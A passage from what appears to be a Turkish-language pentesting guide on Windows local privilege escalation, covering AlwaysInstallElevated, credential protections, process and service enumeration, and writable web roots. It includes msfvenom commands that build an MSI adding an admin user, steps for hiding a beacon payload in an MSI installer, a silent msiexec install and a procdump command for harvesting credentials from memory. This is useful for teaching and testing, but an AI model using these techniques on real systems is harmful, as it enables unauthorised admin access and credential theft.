Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, relay edilen kimliğin nesne ACL'sini ve seçilen COM sınıfının kimlik doğrulama ve impersonation seviyelerini kontrol edin. Çağıranın oturum açma türü ve kimlik bilgisi bağlamı önemlidir: Bir WinRM oturumu, etkileşimli oturum açmadan veya yeni kimlik bilgileriyle yapılan oturum açmadan farklı davranabilir. Güvenlik duvarı/OXID yönlendirmesi ve yüklenen güncellemeler de sonucu değiştirebilir. İzin verici bir ilkeyi veya eşleşen bir ACL'yi incelemeye değer bir durum olarak değerlendirin; pasif enumeration, COM coercion, relay kimlik doğrulaması veya dizin yazma işlemlerini tetiklememelidir. Bir makine hesabına ait shadow credential, makine bileti edinilmesini sağlayabilir; ancak ayrı bir DCSync yoluna yalnızca bu hesap gerekli dizin çoğaltma izinlerine sahipse ulaşılabilir.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) içinde **exploit'i** bulun.

Saldırının akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

Bu 2 kayıt defteri anahtarı **etkinse** (değerleri **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (yürütebilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir meterpreter session'ınız varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Power-up'taki `Write-UserAddMSI` komutunu kullanarak, ayrıcalıkları yükseltmek için geçerli dizinde bir Windows MSI binary'si oluşturun. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişiminiz olmalıdır):

```
Write-UserAddMSI
```

Oluşturulan binary'yi çalıştırarak yetkileri yükseltin.

### MSI Wrapper

Bu araçla MSI wrapper oluşturmayı öğrenmek için bu eğitime göz atın. Yalnızca **komut satırlarını** **çalıştırmak** istiyorsanız, bir "**.bat**" dosyasını da wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**.
- **Visual Studio**'yu açın, **Create a new project** seçeneğini belirleyin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçip **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini belirleyin ve **Create**'e tıklayın.
- 4 adımın 3.'süne (include edilecek dosyaları seçme) gelene kadar **Next**'e tıklayın. **Add**'e tıklayıp az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
  - **Author** ve **Manufacturer** gibi diğer özellikleri de değiştirerek yüklenen uygulamanın daha meşru görünmesini sağlayabilirsiniz.
- Projeye sağ tıklayıp **View > Custom Actions**'ı seçin.
- **Install**'a sağ tıklayıp **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Böylece yükleyici çalıştırılır çalıştırılmaz Beacon payload'ı çalıştırılır.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak, **build edin**.
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI yüklemesi

Kötü amaçlı `.msi` dosyasının **yüklemesini** arka planda çalıştırmak için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu güvenlik açığından yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus ve Tespit Araçları

### Denetim Ayarları

Bu ayarlar neyin **kaydedileceğini** belirler, bu yüzden dikkat etmelisiniz

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding'de günlüklerin nereye gönderildiğini bilmek ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlardaki **yerel Administrator parolalarını yönetmek** ve her parolanın **benzersiz, rastgele oluşturulmuş ve düzenli olarak güncellenmiş** olmasını sağlamak için tasarlanmıştır. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL’ler aracılığıyla yeterli izinler verilmiş kullanıcılar tarafından görüntülenebilir; böylece yetkili kullanıcılar yerel admin parolalarına erişebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** ile birlikte Microsoft, sistemi daha da güvenli hâle getirmek için güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** amacıyla Local Security Authority (LSA) için gelişmiş koruma sunmaya başladı.\
[**LSA Protection hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10**'da kullanıma sunuldu. Amacı, cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba üyeyseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalıkları yükseltmek için bunların nasıl kötüye kullanılacağı hakkında bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

Bu sayfada **token**'ın ne olduğu hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç token'lar hakkında bilgi edinmek** ve bunların nasıl kötüye kullanılacağını öğrenmek için aşağıdaki sayfaya bakın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Ev klasörleri

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola Politikası

```bash
net accounts
```

### Panonun içeriğini alın

```bash
powershell -command "Get-Clipboard"
```

## Çalışan Süreçler

### Dosya ve Klasör İzinleri

Öncelikle süreçleri listelerken **sürecin komut satırında parolalar olup olmadığını kontrol edin**.\
Çalışan bir ikili dosyanın üzerine yazıp yazamayacağınızı veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) için ikili dosyanın bulunduğu klasörde yazma izniniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debuggers** olup olmadığını kontrol edin; bunları ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Bir debugger listener kısa süreli çalışabilir; bu nedenle tek bir pasif port anlık görüntüsünde görünmemesi, hiçbir zaman dışarıya açılmadığını kanıtlamaz. Gözlemlenen listener'ları PID, süreç sahibi ve düşük ayrıcalıklı kullanıcının bu listener'lara erişebilme olanağıyla ilişkilendirin; yalnızca uygulama adı veya debug flag, kullanıcılar arası kod yürütme olanağını kanıtlamaz. Rutin enumeration işlemlerini pasif tutun; debugger komutları göndermeyin.

**Süreçlerin ikili dosyalarının izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Süreçlerin ikili dosyalarının bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor dizinleri

Snort 2, yapılandırmada belirtilen `dynamicpreprocessor directory` konumundaki paylaşımlı kitaplıkları yükleyebilir. Bu yapılandırma, `snort.exe -c <config>` ile seçilir. Snort'u farklı bir hesapla çalıştıran zamanlanmış bir görev veya hizmet için tam olarak bu yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız burada dosya oluşturabiliyorsa bu yol, görev veya hizmet modülleri bir sonraki yüklediğinde code execution açısından incelenmeye değer bir adaydır. Çalıştırma hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve kısıtlamaları (deny veya paylaşım kısıtlamaları) doğrulayın; yalnızca dizinin yazılabilir olması ayrıcalık yükseltmesini kanıtlamaz. [Snort'un dynamic preprocessor belgeleri](https://www.snort.org/documents/dpx-readme), çalışma zamanı modül yüklemesini açıklar.

### Yazılabilir belge köküne sahip ayrıcalıklı web hizmeti

Bir Windows Apache kurulumunda, hizmetin yürütülebilir dosya yolunu ve çalıştırma hesabını etkin `httpd.conf` dosyasındaki `DocumentRoot` ile karşılaştırın. Yaygın bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış belge kökünün (genellikle `C:\xampp\htdocs`) ACL'sini inceleyin. Daha düşük ayrıcalıklı bir kullanıcı bu kökte dosya oluşturabiliyorsa ve Apache `LocalSystem` olarak çalışıyorsa sunucu tarafında code execution, ana makinedeki ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam olarak bu yolun sunulduğunu ve dosya türünün sunucu tarafındaki bir işleyici tarafından işlendiğini doğrulayın; yalnızca kökün yazılabilir olması dosya oluşturulabildiğini kanıtlar. Deneme dosyası yazmadan ACL'leri inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Geleneksel bir WAMP kurulumunda hizmet, sürümü belirtilmiş bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dosyasını (veya 32 bitlik düzende `C:\wamp\...` yolunu) işaret edebilir; yapılandırma dosyası da yanındaki `conf\httpd.conf` konumunda, varsayılan kök dizin ise `C:\wamp64\www` veya `C:\wamp\www` konumundadır. Hizmetin tam yürütülebilir dosya yolunu, hangi kullanıcı hesabıyla çalıştığını, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana makine geçersiz kılmaları dahil) ve kök dizinin ACL'sini birlikte kontrol edin. WAMP dizininin yazılabilir olması, Apache'nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı yürüttüğünü kanıtlamaz. [Apache belgeleri, bir Windows hizmetinin yapılandırmasını nasıl seçtiğini açıklar](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kök dizini ve uygulama havuzunun ağ kimliği

IIS için, `applicationHost.config` dosyasında yazılabilir fiziksel bir dizini **etkin bir site/uygulamayla** eşleştirin, ardından yapılandırılmış havuzu ve sunucu tarafı işleyiciyi belirleyin. Sunulan bir dizine yerleştirilen kod, yalnızca IIS bu dosya türünü işliyorsa ve ilgili yola erişilebiliyorsa havuz kimliğiyle çalışır. Yazılabilir bir dizini kod yürütme olarak değerlendirmeden önce geçerli kullanıcının etkin dosya oluşturma erişimini, sitenin çalışma durumunu, işleyiciyi ve yol bazındaki geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi, incelenmesi gereken ayrı bir yol oluşturur: uygulamanın derleme dizininde oluşturulan dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bunu değiştirebilir. [Microsoft konumu ve uygulama başına alt dizinleri belgeler](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzları birbirine güvenmediğinde derleme dizinlerinin yalıtılmasını önerir](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük ayrıcalıklı bir token, **belirli** uygulamanın önbelleğindeki oluşturulmuş kaynak kodunu değiştirebiliyorsa, bu uygulamanın daha ayrıcalıklı bir [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL'si kod yürütüldüğünü kanıtlamaz: önbelleği etkin uygulama, etkin token ve ACL, derleme ayarları, süreç kimliği ve yeniden derleme zamanlamasıyla ilişkilendirin. Salt okunur üstveri incelemesi yapın; sayım sırasında derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel token'ı düşük ayrıcalıklı olsa bile, genellikle etki alanı kaynaklarına **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrulaması yapar. `LocalSystem` yerelde zaten yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise normalde anonim ağ kimlik bilgileri sunar. `SpecificUser` havuzu, yapılandırılmış hesabını kullanır. [Microsoft bu kimlik türlerini belgeler](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzunun ağ kimliğini açıklar](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Kimlik ayarı belirtilmemişse havuz varsayılanları devralınabilir; bunlar IIS sürümleri arasında değiştiğinden, havuz adından tahmin yürütmek yerine etkin yapılandırmayı çözümleyin. Kod yürütme bilgisayar hesabı ağ kimliğine sahip bir havuza ulaşıyorsa, **ilgili bilgisayarın** dizin haklarını değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma hakları gerektirir; tek başına bir makine hesabı bileti veya ana bilgisayar rolü bu hakların varlığını kanıtlamaz. Pasif sayım sırasında dosya yüklemeden, ağ kimlik doğrulaması yapmadan veya bilet istemeden yapılandırma ve ACL'leri inceleyin.

Yardımcı bir süreç başlatan, okunabilir bir ASP.NET işleyicisi için istekten türetilen tüm değerleri kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma adımları boyunca izleyin. Çözümlenmiş bir token'ı `ProcessStartInfo("cmd", "/c ...")` içine birleştiren bir işleyici, kabuk metakarakterlerinin komutu değiştirmesine izin verebilir; [Microsoft `cmd` komutunun özel karakterlerini belgeler](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir istemcinin çözümlenmiş değeri gerçekten etkileyebildiğini ve işleyiciye ulaşabildiğini doğrulayın; ardından etkin uygulama havuzu veya kimliğe bürünülmüş kullanıcı kimliğini ve alt sürecin kimliğini belirleyin. Okunabilir bir kaynak kod satırı, localhost dinleyicisi veya token biçimindeki bir zayıflık tek başına ayrıcalıklı komut yürütmeyi kanıtlamaz. Pasif sayım sırasında sahte istekler göndermeden veya yardımcı programı çalıştırmadan kaynak kodu ve havuz yapılandırmasını inceleyin.

Windows üzerinde çalışan bir PHP hizmetinde, istekle kontrol edilen ve [`include` or `require`](https://www.php.net/manual/en/function.include.php) içine aktarılan bir yol, düşük kullanıcının yazabildiği bir PHP dosyasını işçi kimliğiyle değerlendirebilir. İsteğin bu ifadeye ulaşabildiğini, çözümlenen yolun düşük kullanıcının değiştirebildiği ve işçinin okuyabildiği bir dosyayı gösterdiğini, geçerli PHP yol kısıtlamalarının dosyanın eklenmesine izin verdiğini ve işçinin gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Tek başına bir loopback dinleyicisi veya yazılabilir dosya bu zinciri kanıtlamaz; pasif sayım sırasında uç noktayı çağırmadan kaynak kodu, hizmet kimliğini ve dosya ACL'lerini inceleyin.

### Bellekten parola madenciliği

Sysinternals'ın **procdump** aracını kullanarak çalışan bir sürecin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetlerin **kimlik bilgileri bellekte açık metin olarak bulunur**; belleği döküp kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın.

### Ayrıcalıklı proje dosyası içe aktarma

Daha düşük ayrıcalıklı bir kullanıcının yazabildiği bir bırakma dizinindeki projeleri otomatik olarak açan bir uygulama, içe aktarıcının hesabı altında bir girdi güven sınırını aşar. **Tam yazılabilir yolu**, bu yolu açan işlemi veya görevi, etkin kimliğini ve ayrıştırıcı derlemesini inceleyin. [Geçmişteki bir Ghidra projesi açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje metadata'sında XML external entities kullanılmasına izin veriyordu; [giden SMB ve NTLM ilkesi](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa Windows üzerindeki bir ağ varlığı, içe aktarma hesabından kimlik doğrulamasına neden olabilir. Bu, kimlik bilgilerinin açığa çıkması için bir inceleme ipucudur; doğrudan yönetici erişimi sağlamaz: yanıtın ayrı ve yetkili ya da savunmasız bir yol üzerinden kullanılabilir olması gerekir ve mevcut derlemeler gerçek yama durumlarına göre değerlendirilmelidir. Pasif keşif sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Hizmetler

Service Control Manager (SCM) nesnesinin [`SC_MANAGER_CREATE_SERVICE` hakkı](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir hizmet üzerindeki haklardan ayrıdır. Bu hak için salt okunur bir [`OpenSCManager erişim isteğinin](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) başarılı olması, yeni bir hizmetin çalıştırılabileceğinin kanıtı değil, inceleme için bir ipucudur. [`CreateService` bir tanıtıcı döndürür](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew); bu tanıtıcı, oluşturma sırasında istenen hizmet erişim haklarını içerir. Hizmeti daha sonra yeniden açmak ayrı bir erişim denetimi yapar ve ilk tanıtıcı kullanılabilir olsa bile başarısız olabilir. Etkin yerel veya uzak belirteci, tanıtıcıya verilen hakları, hizmet hesabını, başlatma ilkesini ve yürütülebilir dosya yolunu ayrı ayrı doğrulayın. Pasif keşif sırasında hizmet oluşturmayın veya başlatmayın.

Uzak hizmet kurulum yolu için, bu SCM haklarını hedefte **aynı ağ oturum açma işleminin** yazabildiği bir paylaşımla, paylaşımın temelindeki NTFS ACL'siyle ve hizmet hesabının çalıştırabileceği yerel bir yürütülebilir dosya yoluyla ilişkilendirin. Olağan dışı ölçüde geniş SCM hakları ve dosya yerleştirme yolu birlikte mevcutsa, yönetici olmayan bir hesap bu sınırı aşabilir; yönetim paylaşımı zorunlu değildir. Yalnızca paylaşıma yazma erişimi veya yalnızca SCM hizmet oluşturma ipucu, yeni hizmetin daha yüksek bir kimlikle başlatılabileceğini kanıtlamaz.

Mevcut bir hizmet, `ImagePath` içinde bulunmasa bile başlangıç, kapanış veya başka bir yaşam döngüsü olayı sırasında bir yardımcı yürütülebilir dosyayı çağırabilir. Yardımcı dosya adı, daha düşük ayrıcalıklı bir kullanıcının yazabildiği bir dizine çözümleniyorsa ve hizmet daha yüksek bir kimlikle çalışıyorsa, eksik yardımcı dosya koşullu bir değiştirme adayıdır. **Gerçek hizmet kodunu veya belgelenmiş yardımcı çağrısını**, çözümlenen yürütülebilir dosya yolunu ve arama sırasını, dizin oluşturma haklarını, hizmet kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir hizmet dizini veya eksik bir dosya tek başına hizmetin bu dosyayı yükleyeceğini kanıtlamaz; pasif inceleme sırasında hizmeti başlatmayın veya durdurmayın.

Mevcut bir hizmet için [`SERVICE_START`, `StartService` çağrısına argüman sağlamaya izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu hak [`SERVICE_CHANGE_CONFIG` hakkından](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) farklıdır. Başlatma erişimini yalnızca bir denetim hakkı olarak değerlendirmeden önce hizmetin kodunu veya belgelenmiş arayüzünü inceleyin. Çağıranın seçtiği bir argümanı günlük veya dışa aktarma yolu olarak kullanıyorsa hizmet kimliğini, argümandan yazma işlemine giden tam akışı, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korumalı bir dizine yazma işlemi, ancak ayrı bir ayrıcalıklı tüketici veya bu dosyayı kabul eden bir yükleyici varsa yükseltmeye dönüşebilir; yazılabilir günlük veya başlatma hakkı tek başına yeterli değildir. Pasif envanter sırasında hizmeti başlatmayın veya test dosyası oluşturmayın.

Bir NSClient++ izleme aracısı için okunabilir bir `nsclient.ini`, **yapılandırma incelemesi ipucudur**: web kimlik bilgileri içerebilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek hizmet hesabını, WEB dinleyicisini ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya script'leri değiştirip değiştiremediğini kontrol edin. Ayrıcalıklı yürütme için ayrıca `CheckExternalScripts` (veya etkin başka bir yürütme yolu), bir komutu kaydetme ya da değiştirme konusunda etkin bir hak ve komutu hizmet kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca loopback arayüzünü dinleyen bir dinleyiciye yerel kullanıcı yine de erişebilir; ancak dosya yolu, parola veya dinleyicinin varlığı tek başına bu hakları kanıtlamaz. Pasif keşif sırasında sırları görüntülemeden veya web API'sini çağırmadan metadata'yı ve izinleri inceleyin. Bkz. [NSClient++ dosya düzeni](https://nsclient.org/docs/concepts/file-layout/), [web ve script güvenliği rehberi](https://nsclient.org/docs/setup/securing/) ve [external-script yapılandırması](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

`ImagePath` değeri `nssm.exe` olan bir hizmet için hizmetin gerçek çalıştırma hesabını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM alt uygulamayı burada depolar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h); `AppDirectory` ise yapılandırılmış çalışma dizinidir. Wrapper'ın izinlerini tüm hizmet sınırı olarak değerlendirmeden önce alt yürütülebilir dosyayı ve üst dizinlerinin ACL'lerini kontrol edin. Bu alt uygulamanın açığa çıkardığı yerel bir WCF veya SOAP uç noktası ayrı bir inceleme ipucudur: düşük ayrıcalıklı kullanıcının dinleyiciye erişebildiğini, ilgili işlemin girdisini kabul ettiğini ve hizmet alt uygulamasının güvenli olmayan işlemi daha yüksek bir kimlikle yürüttüğünü doğrulayın. Hizmet hesabı, uç nokta URL'si veya yazılabilir bir yol tek başına yükseltmeyi kanıtlamaz; pasif keşif sırasında hizmet işlemlerini çağırmayın.

Özel bir WCF işlemi için, çağıranın denetleyebildiği bir dizgenin herhangi bir PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript` script metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) ve [`Pipeline.Invoke` pipeline'ı çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows aktarım kimlik bilgilerini kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **belirli** işlemi çağırma yetkisi ve runspace'in etkin kimliği ayrıca kontrol edilmelidir. Düşük ayrıcalıklı çağıranın girdisinden daha yüksek bir hizmet kimliği altında `AddScript`'e giden bir yol, kod yürütme sınırıdır; dinleme portu, kimliği doğrulanmış istemci veya ilgisiz bir assembly'deki kullanılmayan yöntem tek başına kanıt değildir. Keşif sırasında uç noktayı çağırmadan dağıtılan hizmeti, sözleşmeyi, yetkilendirmeyi ve impersonation ayarlarını statik olarak inceleyin.

Service Triggers, belirli koşullar (named pipe/RPC uç noktası etkinliği, ETW olayları, IP kullanılabilirliği, cihaz bağlanması, GPO yenilemesi vb.) gerçekleştiğinde Windows'un bir hizmeti başlatmasını sağlar. SERVICE_START hakları olmadan bile, tetikleyicileri çalıştırarak ayrıcalıklı hizmetleri çoğu zaman başlatabilirsiniz. Keşif ve etkinleştirme teknikleri burada:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio tanılama toplayıcı hizmeti

C/C++ araçlarını içeren Visual Studio kurulumlarında `LocalSystem` olarak çalışacak şekilde yapılandırılmış `VSStandardCollectorService150` tanılama hizmeti bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), hizmetin DACL sıfırlamasını yönlendirmek için bir junction ve object-manager-link yarışından yararlandı. Gösterilen yükseltme ayrıca kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolunu ve `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefini gerektiriyordu. Bileşendeki açık Ocak 2024'te düzeltildi.

Pasif ilk inceleme için yalnızca bu hizmetin hesabını ve ikili dosya yolunu inceleyin, Setup WMI derleyici yolunun mevcut olup olmadığını kontrol edin ve yüklenen bileşenin yama durumunu doğrulayın. Hizmet girdisi, Visual Studio ürün sürümü veya derleyici dosyası tek başına ana bilgisayarın savunmasız olduğunu kanıtlamaz. İnceleme, hizmeti başlatmayı veya onarım çalıştırmayı gerektirmez.

Hizmetlerin listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmet hakkında bilgi almak için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_’tan **accesschk** binary’sinin bulunması önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

